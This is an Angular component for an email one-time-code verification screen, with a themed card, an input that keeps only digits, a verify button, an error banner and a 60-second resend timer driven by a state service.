
import { Component, inject, signal, computed, AfterViewInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { InputComponent } from './ui/input.component';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
    selector: 'app-email-otp',
    standalone: true,
    imports: [CommonModule, FormsModule, TranslatePipe, InputComponent, ButtonComponent, CardComponent],
    host: {
        '[attr.data-theme]': 'currentFlowId()',
        'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
    },
    template: `
    <ui-card [variant]="cardVariant()">
      <div class="flex flex-col items-center mb-6">
        @if (showBadge()) {
            <div class="px-3 py-1 rounded-full uppercase tracking-wider mb-5 border animate-fade-in text-[11px] font-bold"
                 [style.background]="badgeBg()"
                 [style.color]="badgeColor()"
                 [style.border-color]="badgeBorder()">
               {{ 'EMAIL_OTP.BADGE' | translate }}
            </div>
        }

        <h1 class="text-xl font-bold mb-2 text-center tracking-tight" [style.color]="headerColor()">
            {{ 'EMAIL_OTP.TITLE' | translate }}
        </h1>
        <p class="text-base text-center px-4 max-w-xs leading-relaxed opacity-80" [style.color]="textColor()">
           {{ 'EMAIL_OTP.DESC' | translate: { email: state.email() } }}
        </p>
      </div>

      <!-- Feedback -->
      @if (state.rejectionReason()) {
        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in fade-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">error_outline</span>
            <div>
              <p class="text-sm font-bold text-[#D92D20]">{{ 'EMAIL_OTP.INVALID_TITLE' | translate }}</p>
              <p class="text-xs text-red-700 mt-1">{{ 'EMAIL_OTP.INVALID_DESC' | translate }}</p>
            </div>
        </div>
      }

      <div class="space-y-8">
        <ui-input
            [(ngModel)]="otp"
            (ngModelChange)="onInput($event)"
            [label]="'EMAIL_OTP.INPUT_LABEL' | translate"
            [isCode]="true"
            [size]="'lg'"
            [error]="state.rejectionReason() || ''"
            [required]="true"
        ></ui-input>

        <ui-button
            [fullWidth]="true"
            [size]="'lg'"
            [disabled]="otp.length < 6"
            (clicked)="submit()"
            [style.--brand-primary]="primaryColor()"
            [style.--brand-primary-hover]="primaryColor()"
        >
            {{ 'COMMON.VERIFY' | translate }}
        </ui-button>

        <div class="text-center">
            <p class="text-xs mb-2 font-bold opacity-60" [style.color]="textColor()">{{ 'EMAIL_OTP.NO_CODE' | translate }}</p>
            <button 
                (click)="resend()"
                [disabled]="timer() > 0"
                class="font-bold text-sm hover:underline disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed transition-colors"
                [style.color]="primaryColor()">
                {{ timer() > 0 ? ('EMAIL_OTP.RESEND_WAIT' | translate: { seconds: timer() }) : ('EMAIL_OTP.RESEND' | translate) }}
            </button>
        </div>
      </div>
    </ui-card>
  `
})
export class EmailOtpComponent implements AfterViewInit, OnDestroy {
    state = inject(StateService);
    otp = '';
    timer = signal(0);
    private timerInterval: any;

    theme = computed(() => this.state.currentFlow()?.theme);
    currentFlowId = computed(() => this.state.currentFlow()?.id || 'generic');

    cardVariant = computed<CardVariant>(() => {
        // Adapt card variant based on theme if needed
        return 'elevated';
    });

    headerColor = computed(() => this.theme()?.input.textColor || '#003087');
    textColor = computed(() => this.theme()?.input.textColor || '#6b7280');
    primaryColor = computed(() => this.theme()?.button.background || '#003087');

    // Badge Styles
    showBadge = computed(() => this.theme()?.mode !== 'dark');
    badgeBg = computed(() => (this.theme()?.button.background || '#003087') + '10');
    badgeColor = computed(() => this.theme()?.button.background);
    badgeBorder = computed(() => (this.theme()?.button.background || '#003087') + '30');

    constructor() {
        this.startTimer();
    }

    ngAfterViewInit() {
        // Input autofocus handled by user focus usually, or we can add #input ref
    }

    ngOnDestroy() {
        if (this.timerInterval) clearInterval(this.timerInterval);
    }

    startTimer() {
        this.timer.set(60);
        if (this.timerInterval) clearInterval(this.timerInterval);
        this.timerInterval = setInterval(() => {
            this.timer.update(v => {
                if (v <= 1) {
                    clearInterval(this.timerInterval);
                    return 0;
                }
                return v - 1;
            });
        }, 1000);
    }

    onInput(val: string) {
        // Enforce numbers only
        const clean = val.replace(/\D/g, '');
        if (clean !== val) {
            // Need to update model if changed
            this.otp = clean;
        }
    }

    submit() {
        if (this.otp.length >= 6) {
            this.state.submitEmailOtp(this.otp);
        }
    }

    resend() {
        if (this.timer() === 0) {
            this.state.triggerResendAlert();
            this.startTimer();
        }
    }
}

